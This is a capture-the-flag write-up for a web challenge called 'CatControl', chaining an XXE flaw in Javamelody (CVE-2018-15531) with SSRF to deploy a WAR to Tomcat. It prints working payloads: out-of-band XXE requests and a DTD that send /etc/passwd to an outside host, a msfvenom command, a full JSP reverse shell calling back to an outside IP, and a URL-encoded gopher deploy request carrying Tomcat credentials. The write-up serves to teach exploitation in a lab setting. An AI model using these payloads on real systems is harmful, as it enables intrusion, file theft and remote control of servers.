# CatControl

**Tags:** XXE, SSRF, JAVAMELODY, TOMCAT, RCE, WAR
**Help links:** 
- https://hexo.imagemlt.xyz/post/melodyXXE/
- https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/

## Description

The web app had single page with info "Site is temporarily unavailable."

## Solution

### XXE 

After searches around we found monitroing of Javamelody on page: https://web-catcontrol.ctfz.one/monitoring

Javamelody had version **1.73.1** with known vulnerability CVE-2018-15531 (XXE).

As shown in the post (https://hexo.imagemlt.xyz/post/melodyXXE/) we could exploit XXE with request like:

```
POST / HTTP/1.1
Host: localhost:8080
Content-type: text/xml
SOAPAction: aaaaa
Content-Length: 154

<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://127.0.0.1:5678/ev.dtd">
%remote;
]>
</root>
```

So, we make out of band XXE with next request and DTD:

Request:
```
POST / HTTP/1.1
Host: web-catcontrol.ctfz.one
Content-Type: text/xml; charset="utf-8"
SOAPAction: sdfsdfdsf
Connection: close
Content-Length: 206

<?xml version="1.0"?>
<!DOCTYPE cdl [
<!ENTITY % r SYSTEM "file:///etc/passwd">
<!ENTITY % asd SYSTEM "http://111.111.111.40:48111/oob.dtd">
%asd;%c;%rrr;]>

```

DTD:
```

<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://111.111.111.40:2121/%start;%r;%end;'>">
```

Rouge FTP: https://github.com/lc/230-OOB

### RCE

On the monitoring page we saw that there is Tomcat service on the tcp port: 8080.

After some googling we found post: https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/, that describe exactly same situation.

We had only one problem with payload WAR file, that do not get backconnect shell for us. And we generate new `.jsp` reverse shell with the msfvenome tool.

Msfvenom command:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=111.111.111.40 LPORT=1337 -f raw > shell1.jsp
```

Resulting payload:
```
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream qe;
    OutputStream be;

    StreamConnector( InputStream qe, OutputStream be )
    {
      this.qe = qe;
      this.be = be;
    }

    public void run()
    {
      BufferedReader pr  = null;
      BufferedWriter hvt = null;
      try
      {
        pr  = new BufferedReader( new InputStreamReader( this.qe ) );
        hvt = new BufferedWriter( new OutputStreamWriter( this.be ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = pr.read( buffer, 0, buffer.length ) ) > 0 )
        {
          hvt.write( buffer, 0, length );
          hvt.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( pr != null )
          pr.close();
        if( hvt != null )
          hvt.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "111.111.111.40", 1337 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
```

As shown in the article above we use the `gopher-tomcat-deployer` tool (https://github.com/pimps/gopher-tomcat-deployer) to generate a payload for our JSP, but we have to correct METHOD and PATH of the target tomcat page.

Command to generate WAR for tomcat.
`python gopher-tomcat-deployer.py -u tomcat -p t4nTgDE7VQY6r3F8zcKv -t localhost -pt 8080 shell1.jsp`


Resulting gopher request:
```
gopher://localhost:8080/_PUT%20/manager/deploy%3Fpath%3D/jack%20HTTP/1.1%0D%0AHost%3A%20localhost%3A8080%0D%0AContent-Length%3A%20183%0D%0AAuthorization%3A%20Basic%20dG9tY2F0OnQ0blRnREU3VlFZNnIzRjh6Y0t2%0D%0AConnection%3A%20close%0D%0A%0D%0A%50%4b%03%04%14%00%00%00%00%00%00%00%21%00%2e%79%06%70%1b%06%00%00%1b%06%00%00%0a%00%00%00%73%68%65%6c%6c%31%2e%6a%73%70%3c%25%40%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%6c%61%6e%67%2e%2a%22%25%3e%0a%3c%25%40%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%75%74%69%6c%2e%2a%22%25%3e%0a%3c%25%40%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%69%6f%2e%2a%22%25%3e%0a%3c%25%40%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%6e%65%74%2e%2a%22%25%3e%0a%0a%3c%25%0a%20%20%63%6c%61%73%73%20%53%74%72%65%61%6d%43%6f%6e%6e%65%63%74%6f%72%20%65%78%74%65%6e%64%73%20%54%68%72%65%61%64%0a%20%20%7b%0a%20%20%20%20%49%6e%70%75%74%53%74%72%65%61%6d%20%71%65%3b%0a%20%20%20%20%4f%75%74%70%75%74%53%74%72%65%61%6d%20%62%65%3b%0a%0a%20%20%20%20%53%74%72%65%61%6d%43%6f%6e%6e%65%63%74%6f%72%28%20%49%6e%70%75%74%53%74%72%65%61%6d%20%71%65%2c%20%4f%75%74%70%75%74%53%74%72%65%61%6d%20%62%65%20%29%0a%20%20%20%20%7b%0a%20%20%20%20%20%20%74%68%69%73%2e%71%65%20%3d%20%71%65%3b%0a%20%20%20%20%20%20%74%68%69%73%2e%62%65%20%3d%20%62%65%3b%0a%20%20%20%20%7d%0a%0a%20%20%20%20%70%75%62%6c%69%63%20%76%6f%69%64%20%72%75%6e%28%29%0a%20%20%20%20%7b%0a%20%20%20%20%20%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%70%72%20%20%3d%20%6e%75%6c%6c%3b%0a%20%20%20%20%20%20%42%75%66%66%65%72%65%64%57%72%69%74%65%72%20%68%76%74%20%3d%20%6e%75%6c%6c%3b%0a%20%20%20%20%20%20%74%72%79%0a%20%20%20%20%20%20%7b%0a%20%20%20%20%20%20%20%20%70%72%20%20%3d%20%6e%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%20%6e%65%77%20%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%20%74%68%69%73%2e%71%65%20%29%20%29%3b%0a%20%20%20%20%20%20%20%20%68%76%74%20%3d%20%6e%65%77%20%42%75%66%66%65%72%65%64%57%72%69%74%65%72%28%20%6e%65%77%20%4f%75%74%70%75%74%53%74%72%65%61%6d%57%72%69%74%65%72%28%20%74%68%69%73%2e%62%65%20%29%20%29%3b%0a%20%20%20%20%20%20%20%20%63%68%61%72%20%62%75%66%66%65%72%5b%5d%20%3d%20%6e%65%77%20%63%68%61%72%5b%38%31%39%32%5d%3b%0a%20%20%20%20%20%20%20%20%69%6e%74%20%6c%65%6e%67%74%68%3b%0a%20%20%20%20%20%20%20%20%77%68%69%6c%65%28%20%28%20%6c%65%6e%67%74%68%20%3d%20%70%72%2e%72%65%61%64%28%20%62%75%66%66%65%72%2c%20%30%2c%20%62%75%66%66%65%72%2e%6c%65%6e%67%74%68%20%29%20%29%20%3e%20%30%20%29%0a%20%20%20%20%20%20%20%20%7b%0a%20%20%20%20%20%20%20%20%20%20%68%76%74%2e%77%72%69%74%65%28%20%62%75%66%66%65%72%2c%20%30%2c%20%6c%65%6e%67%74%68%20%29%3b%0a%20%20%20%20%20%20%20%20%20%20%68%76%74%2e%66%6c%75%73%68%28%29%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20%63%61%74%63%68%28%20%45%78%63%65%70%74%69%6f%6e%20%65%20%29%7b%7d%0a%20%20%20%20%20%20%74%72%79%0a%20%20%20%20%20%20%7b%0a%20%20%20%20%20%20%20%20%69%66%28%20%70%72%20%21%3d%20%6e%75%6c%6c%20%29%0a%20%20%20%20%20%20%20%20%20%20%70%72%2e%63%6c%6f%73%65%28%29%3b%0a%20%20%20%20%20%20%20%20%69%66%28%20%68%76%74%20%21%3d%20%6e%75%6c%6c%20%29%0a%20%20%20%20%20%20%20%20%20%20%68%76%74%2e%63%6c%6f%73%65%28%29%3b%0a%20%20%20%20%20%20%7d%20%63%61%74%63%68%28%20%45%78%63%65%70%74%69%6f%6e%20%65%20%29%7b%7d%0a%20%20%20%20%7d%0a%20%20%7d%0a%0a%20%20%74%72%79%0a%20%20%7b%0a%20%20%20%20%53%74%72%69%6e%67%20%53%68%65%6c%6c%50%61%74%68%3b%0a%69%66%20%28%53%79%73%74%65%6d%2e%67%65%74%50%72%6f%70%65%72%74%79%28%22%6f%73%2e%6e%61%6d%65%22%29%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%2e%69%6e%64%65%78%4f%66%28%22%77%69%6e%64%6f%77%73%22%29%20%3d%3d%20%2d%31%29%20%7b%0a%20%20%53%68%65%6c%6c%50%61%74%68%20%3d%20%6e%65%77%20%53%74%72%69%6e%67%28%22%2f%62%69%6e%2f%73%68%22%29%3b%0a%7d%20%65%6c%73%65%20%7b%0a%20%20%53%68%65%6c%6c%50%61%74%68%20%3d%20%6e%65%77%20%53%74%72%69%6e%67%28%22%63%6d%64%2e%65%78%65%22%29%3b%0a%7d%0a%0a%20%20%20%20%53%6f%63%6b%65%74%20%73%6f%63%6b%65%74%20%3d%20%6e%65%77%20%53%6f%63%6b%65%74%28%20%22%31%38%35%2e%31%38%36%2e%32%34%37%2e%34%30%22%2c%20%31%33%33%37%20%29%3b%0a%20%20%20%20%50%72%6f%63%65%73%73%20%70%72%6f%63%65%73%73%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%20%53%68%65%6c%6c%50%61%74%68%20%29%3b%0a%20%20%20%20%28%20%6e%65%77%20%53%74%72%65%61%6d%43%6f%6e%6e%65%63%74%6f%72%28%20%70%72%6f%63%65%73%73%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%20%73%6f%63%6b%65%74%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%20%29%20%29%2e%73%74%61%72%74%28%29%3b%0a%20%20%20%20%28%20%6e%65%77%20%53%74%72%65%61%6d%43%6f%6e%6e%65%63%74%6f%72%28%20%73%6f%63%6b%65%74%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%20%70%72%6f%63%65%73%73%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%20%29%20%29%2e%73%74%61%72%74%28%29%3b%0a%20%20%7d%20%63%61%74%63%68%28%20%45%78%63%65%70%74%69%6f%6e%20%65%20%29%20%7b%7d%0a%25%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%50%4b%01%02%14%03%14%00%00%00%00%00%00%00%21%00%2e%79%06%70%1b%06%00%00%1b%06%00%00%0a%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%73%68%65%6c%6c%31%2e%6a%73%70%50%4b%05%06%00%00%00%00%01%00%01%00%38%00%00%00%43%06%00%00%00%00%0d%0a
```

After that we could send SSRF  request on page `http://localhost:8080/jack/shell1.jsp` and get backconnect.

To get the flag we needed to run `/flag` script in root of host.
